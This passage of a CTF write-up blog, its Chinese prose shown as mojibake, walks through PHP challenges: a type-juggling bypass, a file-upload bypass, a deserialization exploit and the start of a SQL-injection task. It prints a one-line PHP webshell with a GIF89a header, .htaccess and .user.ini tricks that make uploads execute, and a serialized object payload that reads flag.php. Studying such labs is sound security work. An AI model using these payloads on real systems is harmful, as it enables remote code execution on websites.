ç›´æ¥ä½¿ç”¨æ•°ç»„å³å¯ç»•è¿‡ï¼Œè€Œ <kbd>passwd</kbd> å‚æ•°åˆ™åœ¨ <kbd>1234567</kbd> ååŠ å…¥å…¶ä»–éæ•°å­—å­—ç¬¦å³å¯å˜æˆå­—ç¬¦ä¸²ç±»å‹ï¼Œå¹¶ä¸”ä¸æ•°å­—æ¯”è¾ƒæ—¶ä¼šè‡ªåŠ¨å–å‰éƒ¨æ•°å­—åºåˆ—æ¯”è¾ƒï¼Œæ­£å¥½ç›¸ç­‰ï¼Œå› æ­¤æ„é€ å¦‚ä¸‹ <kbd>payload</kbd> å³å¯ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// GET</span><br><span class="line">?id[]=1&amp;gg[]=2</span><br><span class="line"></span><br><span class="line">// POST</span><br><span class="line">passwd=1234567h-t-m</span><br></pre></td></tr></table></figure></li></ul><h2 id="SUCTF-2019-CheckIn">[SUCTF 2019]CheckIn</h2><ul><li><p>æ‰“å¼€é¶æœºä¸ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œçœ‹æ¥è€ƒçš„åˆæ˜¯æ–‡ä»¶ä¸Šä¼ ã€‚</p><img src="0022.webp" alt="" style="zoom:75%"></li><li><p>ç›´æ¥ä¸Šä¼  PHP æœ¨é©¬æ–‡ä»¶ä¼šæç¤ºéæ³•åç¼€ï¼Œå°è¯•åˆ«åä¹‹åä¾ç„¶æç¤ºéæ³•åç¼€ï¼Œè€Œå°†åç¼€åä¿®æ”¹ä¸ºè‡ªå·±åå­—æ—¶åˆ™ä¼šæç¤ºæ–‡ä»¶å«æœ‰ <kbd>&#60;?</kbd> ä¹Ÿå°±æ˜¯ PHP çš„å¼€å¤´æ ‡è¯†ã€‚å› æ­¤å¯ä»¥åˆ¤æ–­ç¨‹åºå¯¹æ–‡ä»¶è®¾æœ‰åç¼€åé»‘åå•è¿‡æ»¤ï¼Œæ­¤å¤–æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡ <kbd>&#60;?</kbd> æ£€æŸ¥ã€‚</p><img src="0023.webp" alt="" style="zoom:75%"></li><li><p>ç»•è¿‡ <kbd>&#60;?</kbd> æ£€æŸ¥åªéœ€ä½¿ç”¨å…¶ä»–å†™æ³•å³å¯ï¼Œä¾‹å¦‚å¯ä»¥å°†æœ¨é©¬æ’å…¥ <kbd>&#60;script&#62;</kbd> æ ‡ç­¾ä¸­ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;h-t-m&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é»‘åå•ç»•è¿‡å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶åŠ è‡ªå®šä¹‰åç¼€åï¼Œé¦–å…ˆå¾—ç¡®å®šèƒ½ä¸Šä¼ é…ç½®æ–‡ä»¶ï¼Œæµ‹è¯•å‘ç°ç¨‹åºè¿˜æœ‰ <kbd>exif&#95;imagetype</kbd> è¿‡æ»¤ã€‚</p><img src="0024.webp" alt="" style="zoom:75%"></li><li><p>è¯¥å‡½æ•°ä¼šæ£€æŸ¥æ–‡ä»¶å¤´ï¼Œå› æ­¤æ„é€ ä¸€ä¸ªåˆæ³•æ–‡ä»¶å¤´å³å¯ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨æœ€ç®€å•çš„ GIF çš„æ–‡ä»¶å¤´ <kbd>GIF89a</kbd>ï¼Œä¹‹åä¸Šä¼  <kbd>.htaccess</kbd> é…ç½®æ–‡ä»¶ä¾¿æˆåŠŸäº†ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;FilesMatch &quot;muma.h-t-m&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸä¹‹åä¼šå›æ˜¾æ–‡ä»¶è·¯å¾„ä»¥åŠç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œè²Œä¼¼ä¸Šä¼ æ–‡ä»¶å¤¹è¿˜æœ‰ä¸€ä¸ª <kbd>index.php</kbd> æ–‡ä»¶ã€‚</p><img src="0025.webp" alt="" style="zoom:75%"></li><li><p>éšåå°†å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„ <kbd>muma.h-t-m</kbd> æ–‡ä»¶ä¸Šä¼ å³å¯ï¼Œå½“ç„¶ï¼Œéœ€è¦æ·»åŠ åˆæ³•æ–‡ä»¶å¤´ä»¥åŠç»•è¿‡ <kbd>&#60;?</kbd> æ£€æŸ¥ï¼Œä¾‹å¦‚å°†æœ¨é©¬æ’å…¥ <kbd>&#60;script&#62;</kbd> æ ‡ç­¾ä¸­ã€‚æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;h-t-m&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹åä¾¿å¯è¿æ¥äº†ï¼Œç†è®ºä¸Šã€‚ä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸï¼Œæµè§ˆå™¨ç›´æ¥è®¿é—®æ–‡ä»¶å‘ç°å¯ä»¥è¢«ä¸‹è½½ï¼Œä¹Ÿå°±æ˜¯è¯´ <kbd>.htaccess</kbd> æ–‡ä»¶å¹¶æ²¡æœ‰ç”Ÿæ•ˆï¼Œ<kbd>muma.h-t-m</kbd> æ–‡ä»¶å¹¶æ²¡æœ‰è¢«è§£æä¸º PHP æ–‡ä»¶ã€‚æŸ¥è¯¢å‘ç°é¶æœºæœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ Nginxï¼Œä¸€èˆ¬æƒ…å†µä¸‹ <kbd>.htaccess</kbd> ä»…é€‚ç”¨äº Apache.</p><img src="0026.webp" alt="" style="zoom:75%"></li><li><p>é‚£ä¹ˆå°±åº”è¯¥è€ƒè™‘èŒƒå›´æ›´å¹¿çš„é…ç½®æ–‡ä»¶ <kbd>.user.ini</kbd>ï¼ŒåŒæ ·æ˜¯åœ¨ <a href="https://h-t-m.top/posts/ddd5444f/">upload-labs</a> æ—¶ä»£çš„è€æœ‹å‹äº†ï¼Œä¸»è¦æœ‰è¿™ä¸¤æ¡æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=muma.h-t-m //åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½muma.h-t-mæ–‡ä»¶</span><br><span class="line">auto_append_file=muma.h-t-m  //åœ¨é¡µé¢åº•éƒ¨åŠ è½½muma.h-t-mæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯ä¼šå°†æ–‡ä»¶å†…å®¹åŒ…å«è¿› PHP æ–‡ä»¶ä¸­å†è¿è¡Œã€‚è€Œè¦è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œè¿˜éœ€è¦ä¸‰ä¸ªå‰ææ¡ä»¶ï¼š</p><ol><li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸º PHP</li><li>æœåŠ¡å™¨ä½¿ç”¨ CGIï¼FastCGI æ¨¡å¼</li><li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„ PHP æ–‡ä»¶</li></ol><p>é‚£å°±å¾ˆæœ‰æ„æ€äº†ï¼Œåœ¨æ­¤å‰æ–‡ä»¶ä¸Šä¼ æˆåŠŸçš„å›æ˜¾æ–‡ä»¶åˆ—è¡¨ä¸­ï¼Œå°±ä¸€ç›´å­˜åœ¨ä¸€ä¸ª <kbd>index.php</kbd> æ–‡ä»¶ï¼Œå°±æ˜¯ä¸“é—¨åœ¨è¿™ç­‰ç€å‘¢ï¼Œ<psw>åœ¨åŒç›®å½•çœ‹åˆ° PHP ç«Ÿç„¶å®Œå…¨æ²¡ååº”è¿‡æ¥æ˜¯ .user.iniï¼Œæƒ­æ„§æƒ­æ„§</psw>ã€‚</p></li><li><p>é‚£ä¹ˆæ¥ä¸‹æ¥æ„é€  <kbd>.user.ini</kbd> æ–‡ä»¶å¹¶å¸¦ä¸Šæ–‡ä»¶å¤´å³å¯ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=muma.h-t-m</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é…åˆä¸Šä¼ ä¹‹å‰çš„ <kbd>muma.h-t-m</kbd> æ–‡ä»¶å³å¯åœ¨ä¸Šä¼ ç›®å½•ä¸‹çš„ <kbd>index.php</kbd> æ–‡ä»¶å¼€å§‹æ’å…¥æœ¨é©¬ï¼Œå› æ­¤ä½¿ç”¨èšå‰‘å·¥å…·è®¿é—® <kbd>index.php</kbd> æ–‡ä»¶å³å¯ã€‚</p><img src="0027.webp" alt="" style="zoom:75%"></li><li><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå®æµ‹åå°è²Œä¼¼ä¼šå®šæ—¶åˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå› æ­¤å¦‚æœä¸Šä¼ åæ˜¾ç¤ºçš„æ–‡ä»¶åˆ—è¡¨ä¸­æ²¡æœ‰åŒæ—¶å‡ºç°ä¸Šä¼ çš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œåˆ™é‡æ–°ä¸Šä¼ ä¸€æ¬¡å³å¯ã€‚</p><img src="0028.webp" alt="" style="zoom:75%"></li></ul><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><ul><li><p>æ‰“å¼€é¶æœºç›´æ¥å°±æ˜¯ä¸€å¤§æ®µä»£ç ï¼Œå¹¶åœ¨å¼€å¤´å¼•å…¥äº† <kbd>flag.php</kbd> æ–‡ä»¶ï¼Œåç»­ä»£ç å¤§è‡´å¯åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šä¸€ä¸ªå‡½æ•°ï¼Œä¸€ä¸ª <kbd>if</kbd> ä»£ç å—ä»¥åŠä¸€ä¸ªç±»å®šä¹‰ã€‚è¯¥ç¨‹åºçš„å…¥å£ä¾¿æ˜¯è¿™ä¸ª <kbd>if</kbd> ä»£ç å—ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">    	<span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶é€šè¿‡ GET æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‚æ•° <kbd>str</kbd>ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ä¹‹åæ”¾å…¥è‡ªå®šä¹‰å‡½æ•° <kbd>is_valid()</kbd> ä¸­ä½œåˆ¤æ–­ä»¥å†³å®šæ˜¯å¦å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ã€‚</p></li><li><p>æ¥ä¸‹æ¥çœ‹çœ‹è¿™ä¸ª <kbd>is_valid()</kbd> å‡½æ•°çš„å…·ä½“å®ç°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¼šé€ä¸ªåˆ¤æ–­å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå…ƒç´ æ˜¯å¦åœ¨å¯æ‰“å°èŒƒå›´ä¹‹å†…ï¼ˆæ— è§† <kbd>~</kbd>ï¼‰ï¼Œå› æ­¤ä¹‹åå…¨éƒ¨ç”±å¯æ‰“å°å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²æ‰å¯é€šè¿‡æ£€æŸ¥å¹¶ååºåˆ—åŒ–ã€‚</p></li><li><p>è€Œæœ€åçš„è¿™ä¸ªç±»å°±åº”è¯¥æ˜¯æœ¬é¢˜ååºåˆ—åŒ–çš„ä¸»è§’äº†ï¼Œè¯¥ç±»ä¸­å«æœ‰ä¸‰ä¸ª <kbd>protected</kbd> å±æ€§çš„æˆå‘˜å˜é‡ä»¥åŠå„ç§å±æ€§çš„æˆå‘˜æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ä¸ºæˆå‘˜å˜é‡èµ‹åˆå€¼</span></span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="comment">// è°ƒç”¨æˆå‘˜æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// op ä¸º 1 åˆ™å†™å…¥ï¼Œop ä¸º 2 åˆ™è¯»å–å¹¶è¾“å‡º</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="comment">// é™åˆ¶å¯å†™å…¥æ•°æ®é•¿åº¦ä¸èƒ½å¤§äº 100</span></span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å‘ filename æŒ‡å‘çš„æ–‡ä»¶ä¸­å†™å…¥ content çš„å†…å®¹</span></span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="comment">// è¯»å–æŒ‡å®šæ–‡ä»¶å†…å®¹</span></span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// è¾“å‡ºå‚æ•°</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// è‹¥ op ä¸º &quot;2&quot; åˆ™æ”¹ä¸º &quot;1&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// è°ƒç”¨æˆå‘˜æ–¹æ³• process</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å„æ–¹æ³•ä¸»è¦ä½œç”¨å·²ç½®äºæ³¨é‡Šä¸­ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„æ˜¯ååºåˆ—åŒ–æ¼æ´ï¼Œå› æ­¤è¯¥ç±»ä¸­å¯èƒ½è¢«ç¨‹åºä¸»åŠ¨è°ƒç”¨çš„å°±åªæœ‰å…¶ææ„å‡½æ•° <kbd>&#95;&#95;destruct</kbd>ï¼Œè¯¥å‡½æ•°ä¼šå°†å˜é‡ <kbd>op</kbd> ä»å­—ç¬¦ <kbd>2</kbd> ä¿®æ”¹ä¸ºå­—ç¬¦ <kbd>1</kbd>ï¼Œè€Œç”± <kbd>process</kbd> å‡½æ•°å¯çŸ¥åªæœ‰ <kbd>op</kbd> å€¼ä¸ºä¸€æ˜¯æ‰å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œå› æ­¤é¦–å…ˆéœ€è¦ç»•è¿‡è¿™é‡Œï¼Œåç»­ <kbd>process</kbd> çš„æ“ä½œä¼šç”±ææ„å‡½æ•°å®Œæˆè°ƒç”¨ã€‚</p></li><li><p>ææ„å‡½æ•°ä¸­å˜é‡ <kbd>op</kbd> ä¸å­—ç¬¦ <kbd>2</kbd> æ¯”è¾ƒæ—¶ä½¿ç”¨çš„æ˜¯å¼ºç­‰äºï¼Œå› æ­¤åªéœ€å°† <kbd>op</kbd> èµ‹å€¼ä¸ºæ•´å½¢æ•°å­— <kbd>2</kbd> å³å¯ç»•è¿‡ã€‚å…¶æ¬¡å°†æˆå‘˜å˜é‡ <kbd>filename</kbd> æŒ‡å®šä¸º <kbd>flag.php</kbd> æœ€åä¾¿å¯è¯»å–ä»–ã€‚è‡³äº <kbd>content</kbd> å˜é‡ï¼Œä¸é‡è¦ã€‚æ‰€ä»¥æ„é€ çš„ç±»å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç°åœ¨ä¸»è¦çš„é—®é¢˜å°±åœ¨äº <kbd>is_valid()</kbd> å‡½æ•°çš„åˆ¤æ–­äº†ï¼Œå…¶é™åˆ¶äº†åºåˆ—åŒ–å­—ç¬¦ä¸²åªèƒ½å«æœ‰å¯æ‰“å°å­—ç¬¦ä¸²ï¼Œè€Œ <kbd>protected</kbd> å±æ€§åˆ™ä¼šåœ¨åºåˆ—åŒ–åçš„å¯¹åº”å­—æ®µåå‰ååŠ ä¸Šç©ºå­—ç¬¦ <kbd>\0</kbd> æ¥ä½œä¸ºæ ‡è¯†ã€‚è€Œè§£å†³æ–¹æ¡ˆå˜›ï¼Œå»æ‰ç©ºå­—ç¬¦å°±å¥½äº†ï¼Œ<psw>å¤ªç²—é²äº†</psw>ã€‚å› ä¸º PHP 7.1+ ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œç›´æ¥å½“ <kbd>public</kbd> å¤„ç†å°±å¥½ï¼Œå®é™…è¯æ˜é¶æœºä½¿ç”¨çš„ PHP ç‰ˆæœ¬ç¡®å®ç¬¦åˆã€‚å› æ­¤ <kbd>payload</kbd> å¦‚ä¸‹ï¼Œå…¶ä¸­ <kbd>op</kbd> å˜é‡å€¼å¿…é¡»ä¸ºæ•´å½¢ï¼Œå³åºåˆ—åŒ–åçš„ç±»å‹æ ‡è¯†ä¸º <kbd>i</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ <kbd>flag</kbd> æ˜¯è¢«æ³¨é‡Šçš„ï¼Œå› æ­¤éœ€è¦ <kbd>F12</kbd> æŸ¥çœ‹ã€‚</p></li></ul><h2 id="GXYCTF2019-BabySQli">[GXYCTF2019]BabySQli</h2><ul><li><p>æ‰“å¼€é¶æœºæ˜¯ä¸€ä¸ªç®€å•çš„ç™»å½•é¡µé¢ï¼Œæµ‹è¯•å‘ç°åœ¨éšä¾¿è¾“å…¥æ•°æ®æ—¶ç½‘é¡µä¼šè·³è½¬åˆ° <kbd>search.php</kbd> å¹¶æç¤º<strong>é”™è¯¯ç”¨æˆ·</strong>ï¼Œè€Œåœ¨ç”¨æˆ·åä½¿ç”¨ <kbd>admin</kbd> æµ‹è¯•æ—¶åˆ™ä¼šæç¤º<strong>é”™è¯¯å¯†ç </strong>ï¼Œå› æ­¤æœ¬é¢˜ç¨‹åºä½¿ç”¨çš„ SQL è¯­å¥å¹¶éä»¥ç”¨æˆ·åå¯†ç åŒæ—¶ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ã€‚å…³äºè¿™ä¸€ç‚¹å¯ä»¥åœ¨ <kbd>search.php</kbd> é¡µé¢çš„æ³¨é‡Šéƒ¨åˆ†æ‰¾åˆ°æç¤ºï¼š</p><img src="0029.webp" alt="" style="zoom:75%"><p>è¯¥æ®µåºåˆ—æ˜¾ç„¶åº”è¯¥æ˜¯åŠ å¯†åçš„ï¼Œä¸€èˆ¬å¤§éƒ¨åˆ†ä¼šé‡‡ç”¨ <kbd>base64</kbd> åŠ å¯†ï¼Œä½†æ˜¯å¾ˆé—æ†¾è¯¥åºåˆ—åªæœ‰æ•°å­—å’Œå¤§å†™å­—æ¯ã€‚ä¸è¿‡è¿˜æ˜¯æœ‰å¯èƒ½æ˜¯ <kbd>base32</kbd> çš„ï¼Œå°è¯• <kbd>base32</kbd> è§£å¯†ä¹‹åå¾—åˆ°å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</span><br></pre></td></tr></table></figure><p>æ ‡å¿—æ€§çš„ç­‰äºå·ï¼ŒåŸºæœ¬å°±æ˜¯ <kbd>base64</kbd> ç¼–ç äº†ï¼Œæè¿™ç­‰ç€å‘¢ï¼Œå†æ¬¡è§£å¯†å³å¯è·å¾—ä¸€å¥ SQL è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç¡®å®šåå°ç¨‹åºé€šè¿‡ç”¨æˆ·åæ¥ä» <kbd>user</kbd> è¡¨ä¸­è·å–æ‰€æœ‰æ•°æ®ï¼Œè€Œè‡³äºå¯†ç 